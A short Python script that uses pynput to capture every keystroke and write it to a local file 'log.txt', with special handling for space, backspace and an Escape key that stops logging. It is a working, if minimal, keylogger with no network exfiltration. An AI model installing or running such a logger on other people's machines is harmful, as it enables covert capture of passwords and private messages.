from pynput.keyboard import Listener
import sys

f = open("log.txt", 'w')

def press(key):
    key = str(key)

    if key == 'Key.space':
        key = " "
    elif key == 'Key.esc':
        f.write('\0')
        f.close()
        sys.exit()
    elif key == 'Key.backspace':
        key = "<-del-"

    f.write(key.replace("'", ""))

with Listener(on_press=press) as l:
    l.join()
